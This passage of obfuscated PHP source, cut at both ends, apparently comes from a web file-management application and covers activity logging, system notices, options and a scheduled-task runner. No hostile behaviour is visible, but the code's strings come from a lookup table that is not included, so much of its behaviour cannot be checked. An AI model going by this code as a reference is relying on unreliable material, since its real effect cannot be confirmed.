$£ü¾Ä‡ó[2269] => LNG($£ü¾Ä‡ó[2270])); } private function typeFile() { $©²ş¯Ë£ =& $_SERVER[§ŒØóıü]; $ÕÜñó½÷ = array($©²ş¯Ë£[1840] => array($©²ş¯Ë£[1841]), $©²ş¯Ë£[2212] => array($©²ş¯Ë£[2271]), $©²ş¯Ë£[2214] => array($©²ş¯Ë£[2272]), $©²ş¯Ë£[1833] => array($©²ş¯Ë£[1834]), $©²ş¯Ë£[2222] => array(), $©²ş¯Ë£[2224] => array(), $©²ş¯Ë£[2226] => array(), $©²ş¯Ë£[1843] => array($©²ş¯Ë£[1845]), $©²ş¯Ë£[1844] => array($©²ş¯Ë£[1845]), $©²ş¯Ë£[2230] => array($©²ş¯Ë£[2273]), $©²ş¯Ë£[2232] => array($©²ş¯Ë£[2273]), $©²ş¯Ë£[2234] => array($©²ş¯Ë£[2274]), $©²ş¯Ë£[2220] => array($©²ş¯Ë£[2275]), $©²ş¯Ë£[1838] => array($©²ş¯Ë£[2276]), $©²ş¯Ë£[2237] => array($©²ş¯Ë£[2277]), $©²ş¯Ë£[1837] => array($©²ş¯Ë£[1839])); return $ÕÜñó½÷; } private function typeAll() { $®òÅ”œœ =& $_SERVER[§ŒØóıü]; $î©äı = $this->typeList; $…œÊ•öø = array_filter($this->typeFile()); foreach ($…œÊ•öø as $¼ÀµÚÆĞ => $ÍÁ¼ç»É) { $î©äı[$ÍÁ¼ç»É[0]] = $î©äı[$¼ÀµÚÆĞ]; } $î©äı[$®òÅ”œœ[1845]] = LNG($®òÅ”œœ[2278]); $î©äı[$®òÅ”œœ[2273]] = LNG($®òÅ”œœ[2279]); return $î©äı; } public function addLog($Ÿ¯ú„´¢, $ì™Ì›ö£ = array()) { $ıÜÒ®ë” =& $_SERVER[§ŒØóıü]; if (!isset($this->typeList[$Ÿ¯ú„´¢])) { return; } $¾èÎ©Œé = USER_ID ? USER_ID : (isset($ì™Ì›ö£[$ıÜÒ®ë”[1673]]) ? $ì™Ì›ö£[$ıÜÒ®ë”[1673]] : 0); if (!$¾èÎ©Œé) { $¾èÎ©Œé = (int) Session::get($ıÜÒ®ë”[1999]); } if ($Ÿ¯ú„´¢ == $ıÜÒ®ë”[2248] && is_array($ì™Ì›ö£[$ıÜÒ®ë”[2280]]) && !$ì™Ì›ö£[$ıÜÒ®ë”[2280]]) { return; } $‡ù €Ñê = get_client_ip(); if (!$ì™Ì›ö£ || strlen(json_encode($ì™Ì›ö£)) >= 1024) { $ì™Ì›ö£ = array($ıÜÒ®ë”[2281] => $‡ù €Ñê); } else { if (is_array($ì™Ì›ö£)) { $ì™Ì›ö£[$ıÜÒ®ë”[2281]] = $‡ù €Ñê; } else { $ì™Ì›ö£ = array($ıÜÒ®ë”[1208] => $ì™Ì›ö£, $ıÜÒ®ë”[2281] => $‡ù €Ñê); } } $ì™Ì›ö£ = array($ıÜÒ®ë”[1663] => Session::sign(), $ıÜÒ®ë”[1664] => $¾èÎ©Œé, $ıÜÒ®ë”[33] => $Ÿ¯ú„´¢, $ıÜÒ®ë”[1666] => json_encode($ì™Ì›ö£)); parent::add($ì™Ì›ö£); } public function remove($…Šíõûë) { $this->where(array($_SERVER[§ŒØóıü][419] => $…Šíõûë))->delete(); } private function _makeOrder($¿”§¡Îñ = '') { $»”Ê¯‹§ =& $_SERVER[§ŒØóıü]; $òí„èÙ = $»”Ê¯‹§[201]; $¸«ãœÔ = array($»”Ê¯‹§[450] => $»”Ê¯‹§[451], $»”Ê¯‹§[452] => $»”Ê¯‹§[453]); $ú€»§ = Input::get($»”Ê¯‹§[458], $»”Ê¯‹§[7], $»”Ê¯‹§[2035], array($»”Ê¯‹§[1953], $»”Ê¯‹§[452])); $ú€»§ = $¸«ãœÔ[$ú€»§]; $¿”§¡Îñ = $¿”§¡Îñ . "{$òí„èÙ}\40{$ú€»§}"; return $this->order($¿”§¡Îñ); } public function get($§ËÏèü = '') { $šöæŠ¨ =& $_SERVER[§ŒØóıü]; if (!$§ËÏèü) { show_json(array()); } $Óçâˆâß = array(); if ($§ËÏèü[$šöæŠ¨[1673]]) { $Óçâˆâß[$šöæŠ¨[1673]] = $§ËÏèü[$šöæŠ¨[1673]]; } if (isset($§ËÏèü[$šöæŠ¨[766]])) { $Úªœ¿‡ı = $§ËÏèü[$šöæŠ¨[766]]; $¬ÒÃ•İ¹ = isset($§ËÏèü[$šöæŠ¨[767]]) ? $§ËÏèü[$šöæŠ¨[767]] : time(); $Óçâˆâß[$šöæŠ¨[201]] = array($šöæŠ¨[333], array($Úªœ¿‡ı, $¬ÒÃ•İ¹)); } if ($§ËÏèü[$šöæŠ¨[33]]) { $—èÄ±êª = explode($šöæŠ¨[50], $§ËÏèü[$šöæŠ¨[33]]); $¿Ê£àš˜ = $this->typeFile(); $Ôğ´Ğü = array(); foreach ($—èÄ±êª as $¯ƒŸŸË±) { $Ôğ´Ğü[] = $¯ƒŸŸË±; if (isset($¿Ê£àš˜[$¯ƒŸŸË±])) { $Ôğ´Ğü = array_merge($Ôğ´Ğü, $¿Ê£àš˜[$¯ƒŸŸË±]); } } $Ôğ´Ğü = array_unique($Ôğ´Ğü); if ($Ôğ´Ğü) { $Óçâˆâß[$šöæŠ¨[33]] = array($šöæŠ¨[7], $Ôğ´Ğü); } } else { $Óçâˆâß[$šöæŠ¨[33]] = array($šöæŠ¨[2282], $šöæŠ¨[2283]); } if (!empty($§ËÏèü[$šöæŠ¨[2281]])) { $Óçâˆâß[$šöæŠ¨[453]] = array($šöæŠ¨[383], "\45{$§ËÏèü[$šöæŠ¨[2281]]}\45"); } $ÌÄ„¯ü„ = $this->_makeOrder()->where($Óçâˆâß)->selectPage(); if (empty($ÌÄ„¯ü„[$šöæŠ¨[369]])) { show_json(array(), !0, $ÌÄ„¯ü„[$šöæŠ¨[366]]); } $ÌÄ„¯ü„[$šöæŠ¨[369]] = $this->logList($ÌÄ„¯ü„[$šöæŠ¨[369]]); return $ÌÄ„¯ü„; } private function ipAddress(&$³©–ËÛ) { $¨ÊçŸÅ =& $_SERVER[§ŒØóıü]; if (!empty($³©–ËÛ[$¨ÊçŸÅ[2281]])) { $ªäè‡’ = IpLocation::get($³©–ËÛ[$¨ÊçŸÅ[2281]]); } else { $ªäè‡’ = LNG($¨ÊçŸÅ[2284]); } $³©–ËÛ[$¨ÊçŸÅ[2285]] = $ªäè‡’; } private function descZipDownload($Ö€ç–í, &$ª±‡ş¶) { $ÆÁ¨Ü‚ñ =& $_SERVER[§ŒØóıü]; if (!isset($Ö€ç–í[$ÆÁ¨Ü‚ñ[2286]])) { return; } $ì˜ÒÒ©Í = json_decode($Ö€ç–í[$ÆÁ¨Ü‚ñ[2286]], !0); foreach ($ì˜ÒÒ©Í as $Òé¡Ó‰Ğ) { try { $ı³Ô‡ë = IO::infoFull($Òé¡Ó‰Ğ[$ÆÁ¨Ü‚ñ[84]]); } catch (Exception $³ò±İ€¼) { continue; } $Ö€ç–í[$ÆÁ¨Ü‚ñ[84]] = $Òé¡Ó‰Ğ[$ÆÁ¨Ü‚ñ[84]]; $ª±‡ş¶[] = $Ö€ç–í[$ÆÁ¨Ü‚ñ[402]] = $ı³Ô‡ë[$ÆÁ¨Ü‚ñ[402]]; $ª±‡ş¶[] = $Ö€ç–í[$ÆÁ¨Ü‚ñ[2089]] = $ı³Ô‡ë[$ÆÁ¨Ü‚ñ[432]]; break; } return $Ö€ç–í; } private function getSourceList(&$ˆ‹©÷¾º) { $ß¤¦ª°· =& $_SERVER[§ŒØóıü]; $İ«Ä¹Úå = array(); foreach ($ˆ‹©÷¾º as $úéî³ => $ÄÎ¶‘ÆÁ) { $­Ûó³Å½ = json_decode($ÄÎ¶‘ÆÁ[$ß¤¦ª°·[453]], !0); if ($ÄÎ¶‘ÆÁ[$ß¤¦ª°·[33]] == $ß¤¦ª°·[1836]) { $­Ûó³Å½ = $this->descZipDownload($­Ûó³Å½, $İ«Ä¹Úå); $ˆ‹©÷¾º[$úéî³][$ß¤¦ª°·[453]] = json_encode($­Ûó³Å½); continue; } if (strpos($ÄÎ¶‘ÆÁ[$ß¤¦ª°·[33]], $ß¤¦ª°·[2091]) !== 0) { if (!isset($­Ûó³Å½[$ß¤¦ª°·[84]]) || strpos($ÄÎ¶‘ÆÁ[$ß¤¦ª°·[33]], $ß¤¦ª°·[2287]) !== 0) { continue; } try { $Š˜ªÛ­› = IO::infoFull($­Ûó³Å½[$ß¤¦ª°·[84]]); } catch (Exception $–ØûÍ¥) { continue; } $İ«Ä¹Úå[] = $­Ûó³Å½[$ß¤¦ª°·[402]] = $Š˜ªÛ­›[$ß¤¦ª°·[402]]; $İ«Ä¹Úå[] = $­Ûó³Å½[$ß¤¦ª°·[2089]] = $Š˜ªÛ­›[$ß¤¦ª°·[432]]; $ˆ‹©÷¾º[$úéî³][$ß¤¦ª°·[453]] = json_encode($­Ûó³Å½); continue; } $İ«Ä¹Úå[] = $­Ûó³Å½[$ß¤¦ª°·[402]]; $İ«Ä¹Úå[] = $­Ûó³Å½[$ß¤¦ª°·[2089]]; if ($­Ûó³Å½[$ß¤¦ª°·[33]] == $ß¤¦ª°·[548]) { $İ«Ä¹Úå[] = $­Ûó³Å½[$ß¤¦ª°·[453]][$ß¤¦ª°·[1166]]; $İ«Ä¹Úå[] = $­Ûó³Å½[$ß¤¦ª°·[453]][$ß¤¦ª°·[1167]]; } if ($­Ûó³Å½[$ß¤¦ª°·[33]] == $ß¤¦ª°·[2099]) { $İ«Ä¹Úå[] = $­Ûó³Å½[$ß¤¦ª°·[453]][$ß¤¦ª°·[402]]; } } if (!$İ«Ä¹Úå) { return array(); } return Model($ß¤¦ª°·[831])->sourceListInfo($İ«Ä¹Úå, !0); } private function logList($Š¦»É×Ï) { $Ù¿·î±æ =& $_SERVER[§ŒØóıü]; $„ µÅ“¸ = array_to_keyvalue($Š¦»É×Ï, $Ù¿·î±æ[12], $Ù¿·î±æ[1673]); $ß² Š‚œ = Model($Ù¿·î±æ[525])->userListInfo(array_unique($„ µÅ“¸)); $·ŞÕ”¤Ğ = $this->getSourceList($Š¦»É×Ï); $˜şšîœñ = $this->typeAll(); $ìÈÒ¶‡… = array(); $Ïåèí°² = array(); foreach ($Š¦»É×Ï as $í š°ãñ => $ÍÍå¸½) { $àÑæ—âù = $ÍÍå¸½[$Ù¿·î±æ[33]]; $³ªùİœü = isset($ß² Š‚œ[$ÍÍå¸½[$Ù¿·î±æ[1673]]]) ? $ß² Š‚œ[$ÍÍå¸½[$Ù¿·î±æ[1673]]] : !1; $ô²—ĞøĞ = strpos($àÑæ—âù, $Ù¿·î±æ[2288]) === 0 ? LNG($Ù¿·î±æ[2289]) : LNG($Ù¿·î±æ[2284]); $ÍÍå¸½[$Ù¿·î±æ[32]] = isset($³ªùİœü[$Ù¿·î±æ[32]]) ? $³ªùİœü[$Ù¿·î±æ[32]] : LNG($Ù¿·î±æ[2284]); $ÍÍå¸½[$Ù¿·î±æ[532]] = isset($³ªùİœü[$Ù¿·î±æ[532]]) ? $³ªùİœü[$Ù¿·î±æ[532]] : $Ù¿·î±æ[12]; $ÍÍå¸½[$Ù¿·î±æ[1573]] = isset($˜şšîœñ[$àÑæ—âù]) ? $˜şšîœñ[$àÑæ—âù] : $ô²—ĞøĞ; $ÍÍå¸½[$Ù¿·î±æ[2034]] = $³ªùİœü; $ÄğË’‘× = json_decode($ÍÍå¸½[$Ù¿·î±æ[453]], !0); $ÍÍå¸½[$Ù¿·î±æ[2281]] = isset($ÄğË’‘×[$Ù¿·î±æ[2281]]) ? $ÄğË’‘×[$Ù¿·î±æ[2281]] : $Ù¿·î±æ[12]; $ÍÍå¸½[$Ù¿·î±æ[2285]] = IpLocation::get($ÍÍå¸½[$Ù¿·î±æ[2281]]); if (strpos($àÑæ—âù, $Ù¿·î±æ[2091]) === 0 || isset($ÄğË’‘×[$Ù¿·î±æ[2089]])) { $ÄğË’‘×[$Ù¿·î±æ[87]] = $·ŞÕ”¤Ğ[$ÄğË’‘×[$Ù¿·î±æ[402]]]; $ÄğË’‘×[$Ù¿·î±æ[2104]] = $·ŞÕ”¤Ğ[$ÄğË’‘×[$Ù¿·î±æ[2089]]]; if ($ÄğË’‘×[$Ù¿·î±æ[33]] == $Ù¿·î±æ[548]) { $ÄğË’‘×[$Ù¿·î±æ[453]][$Ù¿·î±æ[1166]] = $·ŞÕ”¤Ğ[$ÄğË’‘×[$Ù¿·î±æ[453]][$Ù¿·î±æ[1166]]]; $ÄğË’‘×[$Ù¿·î±æ[453]][$Ù¿·î±æ[1167]] = $·ŞÕ”¤Ğ[$ÄğË’‘×[$Ù¿·î±æ[453]][$Ù¿·î±æ[1167]]]; } if ($ÄğË’‘×[$Ù¿·î±æ[33]] == $Ù¿·î±æ[2099]) { $ÄğË’‘×[$Ù¿·î±æ[453]][$Ù¿·î±æ[402]] = $·ŞÕ”¤Ğ[$ÄğË’‘×[$Ù¿·î±æ[453]][$Ù¿·î±æ[402]]]; } if ($ÄğË’‘×[$Ù¿·î±æ[33]] == $Ù¿·î±æ[1831]) { $ÄğË’‘×[$Ù¿·î±æ[2104]] = $ÄğË’‘×[$Ù¿·î±æ[87]]; $ÄğË’‘×[$Ù¿·î±æ[2089]] = $ÄğË’‘×[$Ù¿·î±æ[2104]][$Ù¿·î±æ[402]]; $ÄğË’‘×[$Ù¿·î±æ[87]] = !1; $ÄğË’‘×[$Ù¿·î±æ[402]] = $Ù¿·î±æ[12]; } if ($ÄğË’‘×[$Ù¿·î±æ[87]] && $ÄğË’‘×[$Ù¿·î±æ[87]][$Ù¿·î±æ[411]] == $Ù¿·î±æ[1290]) { $Ïåèí°²[] = $ÍÍå¸½[$Ù¿·î±æ[399]]; unset($Š¦»É×Ï[$í š°ãñ]); continue; } if ($ÄğË’‘×[$Ù¿·î±æ[2104]] && $ÄğË’‘×[$Ù¿·î±æ[2104]][$Ù¿·î±æ[411]] == $Ù¿·î±æ[1290]) { $Ïåèí°²[] = $ÍÍå¸½[$Ù¿·î±æ[399]]; unset($Š¦»É×Ï[$í š°ãñ]); continue; } } $ÍÍå¸½[$Ù¿·î±æ[453]] = $ÄğË’‘×; unset($ÍÍå¸½[$Ù¿·î±æ[2290]]); $ìÈÒ¶‡…[] = $ÍÍå¸½; } $this->clearSystemPathLog($Ïåèí°²); return $ìÈÒ¶‡…; } private function clearSystemPathLog($­¾ÇìÁş) { $¶ğ‡±Ó× =& $_SERVER[§ŒØóıü]; if (count($­¾ÇìÁş) == 0) { return; } $ş¨¨ß¿Î = array($¶ğ‡±Ó×[399] => array($¶ğ‡±Ó×[7], array_unique($­¾ÇìÁş))); $this->where($ş¨¨ß¿Î)->delete(); } public function deviceList($ùğ¯Ö’¨, $×ÊÊ¢Œš = 0) { $îÑ¨Åéé =& $_SERVER[§ŒØóıü]; $¶ü»”ÓÛ = array($îÑ¨Åéé[1673] => $ùğ¯Ö’¨, $îÑ¨Åéé[201] => array($îÑ¨Åéé[1020], $×ÊÊ¢Œš), $îÑ¨Åéé[33] => $îÑ¨Åéé[1805]); $Å¢´Ñï› = array(); $•ÆÌØñ€ = $this->field($îÑ¨Åéé[2291])->where($¶ü»”ÓÛ)->order($îÑ¨Åéé[2102])->limit(50)->select(); foreach ($•ÆÌØñ€ as $ÌëÃÆÚ¤ => $õ Ìª•) { if ($ÌëÃÆÚ¤ > 0 && abs($õ Ìª•[$îÑ¨Åéé[201]] - $•ÆÌØñ€[$ÌëÃÆÚ¤ - 1][$îÑ¨Åéé[201]]) < 5) { continue; } $š†Ñ±¿‘ = json_decode($õ Ìª•[$îÑ¨Åéé[453]], !0); $õ Ìª•[$îÑ¨Åéé[2281]] = isset($š†Ñ±¿‘[$îÑ¨Åéé[2281]]) ? $š†Ñ±¿‘[$îÑ¨Åéé[2281]] : $îÑ¨Åéé[12]; unset($š†Ñ±¿‘[$îÑ¨Åéé[2281]]); $£¦ßÊµå = $this->deviceType($š†Ñ±¿‘[$îÑ¨Åéé[2092]]); if (isset($Å¢´Ñï›[$£¦ßÊµå])) { continue; } $õ Ìª•[$îÑ¨Åéé[2285]] = IpLocation::get($õ Ìª•[$îÑ¨Åéé[2281]]); $õ Ìª•[$îÑ¨Åéé[453]] = $š†Ñ±¿‘; $Å¢´Ñï›[$£¦ßÊµå] = $õ Ìª•; } return array_values($Å¢´Ñï›); } public function deviceType($¤«‚³î¡) { return $¤«‚³î¡; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\123\x79\x73\164\x65\x6d\56\156\157\x74\151\x63\145\x4c\151\163\164"; public $field = array("\156\141\x6d\145", "\143\157\156\164\x65\156\164", "\x61\x75\x74\x68", "\155\157\x64\x65", "\x74\151\x6d\x65", "\x74\171\x70\x65", "\x6c\145\166\145\154", "\145\x6e\x61\142\154\x65", "\163\x6f\x72\x74"); public function listData($ìƒ›¹ÒÀ = false, $Å©‚“à“ = "\x73\157\x72\x74", $ˆ©¼çÎŞ = false) { return parent::listData($ìƒ›¹ÒÀ, $Å©‚“à“, $ˆ©¼çÎŞ); } public function add($––ÜÕÓá) { $ÒÖåêì§ =& $_SERVER[§ŒØóıü]; $¼¼Ÿöøä = time(); if ($––ÜÕÓá[$ÒÖåêì§[16]] == $ÒÖåêì§[2292]) { $¼¼Ÿöøä = strtotime($––ÜÕÓá[$ÒÖåêì§[180]]); } $––ÜÕÓá[$ÒÖåêì§[180]] = $¼¼Ÿöøä; return parent::insert($––ÜÕÓá); } public function update($ì€æâ¤, $¤¯õáä®) { $…Æ¢÷ï« =& $_SERVER[§ŒØóıü]; $è³ùÑûÑ = $this->listData($ì€æâ¤); if (!$è³ùÑûÑ) { return !1; } $­Ø‹õ–Æ = time(); if ($¤¯õáä®[$…Æ¢÷ï«[16]] == $…Æ¢÷ï«[2292]) { $­Ø‹õ–Æ = strtotime($¤¯õáä®[$…Æ¢÷ï«[180]]); } $¤¯õáä®[$…Æ¢÷ï«[180]] = $­Ø‹õ–Æ; return parent::update($ì€æâ¤, $¤¯õáä®); } public function remove($œ¶Ç”˜Ö) { $ßˆ¾í±€ = $this->listData($œ¶Ç”˜Ö); if (!$ßˆ¾í±€ || $ßˆ¾í±€[$_SERVER[§ŒØóıü][1290]]) { return !1; } return parent::remove($œ¶Ç”˜Ö); } public function sort($õÕã†Î², $°Ë¼Ö˜©) { return parent::update($õÕã†Î², $°Ë¼Ö˜©); } public function enable($Ìò¾Ôˆù, $†Ş¹À¸ğ) { return parent::update($Ìò¾Ôˆù, array($_SERVER[§ŒØóıü][2293] => $†Ş¹À¸ğ)); } private function initUserOption() { $›ç•¯«ç =& $_SERVER[§ŒØóıü]; $this->optionType = $›ç•¯«ç[2294]; $this->modelType = $›ç•¯«ç[2295]; $this->field = array($›ç•¯«ç[2296], $›ç•¯«ç[32], $›ç•¯«ç[180], $›ç•¯«ç[33], $›ç•¯«ç[2297], $›ç•¯«ç[755], $›ç•¯«ç[196]); } public function userNoticeGet($¤•öóÇ = false) { $this->initUserOption(); return parent::listData($¤•öóÇ, $_SERVER[§ŒØóıü][399], !0); } public function userNoticeAdd($Îì±íÛ¢) { $Ó†ÓÒõµ =& $_SERVER[§ŒØóıü]; $this->initUserOption(); $ìâäº­ğ = $this->findByKey($Ó†ÓÒõµ[2296], $Îì±íÛ¢[$Ó†ÓÒõµ[399]]); if ($ìâäº­ğ) { return !0; } $™»‰¾ó‚ = array($Ó†ÓÒõµ[2296] => $Îì±íÛ¢[$Ó†ÓÒõµ[399]], $Ó†ÓÒõµ[32] => $Îì±íÛ¢[$Ó†ÓÒõµ[32]], $Ó†ÓÒõµ[180] => $Îì±íÛ¢[$Ó†ÓÒõµ[180]], $Ó†ÓÒõµ[33] => isset($Îì±íÛ¢[$Ó†ÓÒõµ[33]]) ? $Îì±íÛ¢[$Ó†ÓÒõµ[33]] : 1, $Ó†ÓÒõµ[2297] => isset($Îì±íÛ¢[$Ó†ÓÒõµ[2297]]) ? $Îì±íÛ¢[$Ó†ÓÒõµ[2297]] : 0, $Ó†ÓÒõµ[755] => 0, $Ó†ÓÒõµ[196] => 0); return parent::insert($™»‰¾ó‚); } public function userNoticeEdit($ä¸ñ½±ä, $·óˆùâŸ) { $this->initUserOption(); return parent::update($ä¸ñ½±ä, $·óˆùâŸ); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\163\171\x73\164\145\x6d\137\157\160\x74\x69\x6f\x6e"; protected $jsonField = array("\x6d\145\x6e\x75", "\162\x6f\x6c\145", "\x72\157\x6c\x65\107\x72\157\x75\160", "\162\145\147\151\163\164", "\x65\155\x61\x69\x6c"); function __construct() { parent::__construct(); } protected function cacheKey($¦«ú–î”) { return "\123\x79\163\x74\145\x6d\117\160\164\x69\157\x6e\x5f{$¦«ú–î”}"; } protected function optionDefault($·ÍÏ‰¼œ = '') { $Œ«ÕãÖÔ =& $_SERVER[§ŒØóıü]; if ($·ÍÏ‰¼œ == $Œ«ÕãÖÔ[12]) { return $GLOBALS[$Œ«ÕãÖÔ[6]][$Œ«ÕãÖÔ[381]]; } } } goto Fôó‰‡Ò„¢; DÙÒ…ÁÈ»•: define($_SERVER[§ŒØóıü][241], 1); define($_SERVER[§ŒØóıü][242], 0); define($_SERVER[§ŒØóıü][243], 2); goto C±öîàğİ•; d¥ÆÔ‹·İ½: class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $¿Ø±‹Ìö =& $_SERVER[§ŒØóıü]; if (self::valueGet($¿Ø±‹Ìö[755]) != $¿Ø±‹Ìö[88]) { return; } if (self::valueGet($¿Ø±‹Ìö[1632]) == $¿Ø±‹Ìö[88]) { $Ë¥¯ÛÃ = self::valueGet($¿Ø±‹Ìö[1633]); if (time() - $Ë¥¯ÛÃ > self::AUTO_RESTART_TIME) { self::restart(); } return; } http_close(); $GLOBALS[$¿Ø±‹Ìö[1634]] = 1; self::valueSet($¿Ø±‹Ìö[1632], $¿Ø±‹Ìö[88]); self::log($¿Ø±‹Ìö[1635] . ACTION . $¿Ø±‹Ìö[1636]); Session::$data = array(); Session::$sessionSign = $¿Ø±‹Ìö[12]; $GLOBALS[$¿Ø±‹Ìö[494]] = 1; Hook::bind($¿Ø±‹Ìö[1637], $¿Ø±‹Ìö[1638]); $¥¿íéº = 0; while (!0) { self::cacheClear(); if (self::valueGet($¿Ø±‹Ìö[755]) != $¿Ø±‹Ìö[88]) { self::valueSet($¿Ø±‹Ìö[1632], $¿Ø±‹Ìö[198]); self::log($¿Ø±‹Ìö[1639]); die; } $ƒ¾µĞ÷Â = time(); if ($ƒ¾µĞ÷Â - $¥¿íéº >= 60) { self::valueSet(array($¿Ø±‹Ìö[1632] => $¿Ø±‹Ìö[88], $¿Ø±‹Ìö[1633] => $ƒ¾µĞ÷Â), !1); $¥¿íéº = $ƒ¾µĞ÷Â; } if (!file_exists(USER_SYSTEM . $¿Ø±‹Ìö[1640])) { self::valueSet(array($¿Ø±‹Ìö[1632] => $¿Ø±‹Ìö[198], $¿Ø±‹Ìö[755] => $¿Ø±‹Ìö[198]), !1); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function restart() { $‹ËÁ¦¸» =& $_SERVER[§ŒØóıü]; http_close(); self::valueSet($‹ËÁ¦¸»[755], $‹ËÁ¦¸»[198]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($‹ËÁ¦¸»[1632] => $‹ËÁ¦¸»[198], $‹ËÁ¦¸»[755] => $‹ËÁ¦¸»[88]), !1); } public static function taskSwitch() { $áÍ•ê­ö =& $_SERVER[§ŒØóıü]; $é‹•ñ†Æ = self::valueGet($áÍ•ê­ö[755]) == $áÍ•ê­ö[88] ? $áÍ•ê­ö[198] : $áÍ•ê­ö[88]; self::valueSet($áÍ•ê­ö[755], $é‹•ñ†Æ); } public static function shutdownEvent() { $ˆ®¤³… =& $_SERVER[§ŒØóıü]; self::valueSet($ˆ®¤³…[1632], $ˆ®¤³…[198]); self::log($ˆ®¤³…[1641]); } public static function config($ç‹ÃÆ•Ò, $âèè°ËÈ) { self::valueSet($_SERVER[§ŒØóıü][755], $ç‹ÃÆ•Ò); } private static function taskRunAll() { $¢õ¼şë =& $_SERVER[§ŒØóıü]; $ÃıÏ¾‹ = timeFloat(); $†åÔ‚òÒ = Model($¢õ¼şë[1642])->listData(); $Õ—‰óÃí = count($†åÔ‚òÒ); for ($Ç‹¨˜œ = 0; $Ç‹¨˜œ < $Õ—‰óÃí; $Ç‹¨˜œ++) { $‚”Åˆ©¼ = $†åÔ‚òÒ[$Ç‹¨˜œ]; if (!$‚”Åˆ©¼[$¢õ¼şë[399]] || $‚”Åˆ©¼[$¢õ¼şë[1643]] != $¢õ¼şë[88]) { continue; } if (!self::taskTimeCheck($‚”Åˆ©¼)) { continue; } self::taskRun($‚”Åˆ©¼); } Hook::trigger($¢õ¼şë[1644]); self::taskQueueRun($ÃıÏ¾‹); } private static function taskQueueRun($şÂÔÑäó) { $Ö°¤”üÒ = 10; while (!0) { $ˆ‡ï¿ƒ— = TaskQueue::run(); if ($ˆ‡ï¿ƒ— === !1) { break; } if (timeFloat() - $şÂÔÑäó >= $Ö°¤”üÒ) { break; } } } private static function taskTimeCheck($ËÀ–‹ÚÈ) { $“–ë¤¾õ =& $_SERVER[§ŒØóıü]; $çÆÍŸ§ = json_decode($ËÀ–‹ÚÈ[$“–ë¤¾õ[180]], !0); $úˆá¤®î = intval($ËÀ–‹ÚÈ[$“–ë¤¾õ[1633]]); $è²Ë« = strtotime($“–ë¤¾õ[1645] . $çÆÍŸ§[$“–ë¤¾õ[1646]] . $“–ë¤¾õ[1647]) - strtotime($“–ë¤¾õ[1648]); $³Ğ‚£– = time() - strtotime(date($“–ë¤¾õ[1649]) . $“–ë¤¾õ[1650]); $¸ìğ•¨ = $³Ğ‚£– >= $è²Ë« && $³Ğ‚£– <= $è²Ë« + 3600; switch ($çÆÍŸ§[$“–ë¤¾õ[33]]) { case $“–ë¤¾õ[1651]: if (time() - $úˆá¤®î < 3600 * 24 * 30) { return !1; } if ($çÆÍŸ§[$“–ë¤¾õ[1651]] == date($“–ë¤¾õ[1652]) && $¸ìğ•¨) { return !0; } break; case $“–ë¤¾õ[1653]: if (time() - $úˆá¤®î < 3600 * 24 * 7) { return !1; } $ğÕ©‡›€ = date($“–ë¤¾õ[1654]) == 0 ? 7 : date($“–ë¤¾õ[1654]); if ($çÆÍŸ§[$“–ë¤¾õ[1653]] == $ğÕ©‡›€ && $¸ìğ•¨) { return !0; } break; case $“–ë¤¾õ[1646]: if (time() - $úˆá¤®î < 3600 * 24) { return !1; } if ($¸ìğ•¨) { return !0; } break; case $“–ë¤¾õ[1655]: if (time() - $úˆá¤®î >= floatval($çÆÍŸ§[$“–ë¤¾õ[1655]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $üÚúü´­ =& $_SERVER[§ŒØóıü]; static $İßÄù±· = 0; $ØÏÊ˜Ö = 300; if (!$İßÄù±·) { $İßÄù±· = time(); } if (time() - $İßÄù±· < $ØÏÊ˜Ö) { return; } $İßÄù±· = time(); $‹ßÈ‹î = Model($üÚúü´­[504])->db($üÚúü´­[12]); if ($‹ßÈ‹î) { $‹ßÈ‹î->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($üÚúü´­[1656], $üÚúü´­[1657]); die; } } public static function taskRun($âíÒŠÔ¡) { $äƒÙ²Óó =& $_SERVER[§ŒØóıü]; self::log($äƒÙ²Óó[1658] . $âíÒŠÔ¡[$äƒÙ²Óó[399]] . $äƒÙ²Óó[1659] . $âíÒŠÔ¡[$äƒÙ²Óó[32]] . $äƒÙ²Óó[1660] . $âíÒŠÔ¡[$äƒÙ²Óó[1661]]); Model($äƒÙ²Óó[1642])->run($âíÒŠÔ¡[$äƒÙ²Óó[399]]); $Š’Èİ = timeFloat(); $ıŞèƒ‡ = $äƒÙ²Óó[12]; switch ($âíÒŠÔ¡[$äƒÙ²Óó[33]]) { case $äƒÙ²Óó[307]: $ÙÇ‘¢ = url_request($âíÒŠÔ¡[$äƒÙ²Óó[1661]], $äƒÙ²Óó[230], !1, !1, !1, !1, 10); if ($ÙÇ‘¢[$äƒÙ²Óó[755]]) { $ıŞèƒ‡ = strlen($ÙÇ‘¢[$äƒÙ²Óó[1208]]); } break; case $äƒÙ²Óó[229]: $ıŞèƒ‡ = Hook::apply($âíÒŠÔ¡[$äƒÙ²Óó[1661]]); default: break; } Model($äƒÙ²Óó[1662])->add(array($äƒÙ²Óó[1663] => $äƒÙ²Óó[12], $äƒÙ²Óó[1664] => $äƒÙ²Óó[198], $äƒÙ²Óó[33] => $äƒÙ²Óó[1665] . $âíÒŠÔ¡[$äƒÙ²Óó[399]], $äƒÙ²Óó[1666] => json_encode(array($äƒÙ²Óó[32] => $âíÒŠÔ¡[$äƒÙ²Óó[32]], $äƒÙ²Óó[1667] => timeFloat() - $Š’Èİ, $äƒÙ²Óó[293] => $ıŞèƒ‡)))); $³‡Õª­á = $ıŞèƒ‡ ? $äƒÙ²Óó[1668] . $ıŞèƒ‡ : $äƒÙ²Óó[12]; self::log($äƒÙ²Óó[1669] . $âíÒŠÔ¡[$äƒÙ²Óó[399]] . $äƒÙ²Óó[164] . $³‡Õª­á); return !0; } private static function valueGet($’¨¯–ëº) { $†¨’Å©¾ =& $_SERVER[§ŒØóıü]; $Àş… Î« = $†¨’Å©¾[1670]; $ü”‘¸ÖÌ = Model($†¨’Å©¾[435])->get($’¨¯–ëº, $Àş… Î«); if (is_null($ü”‘¸ÖÌ)) { Model($†¨’Å©¾[435])->set($†¨’Å©¾[755], $†¨’Å©¾[88], $Àş… Î«); Model($†¨’Å©¾[435])->set($†¨’Å©¾[1632], 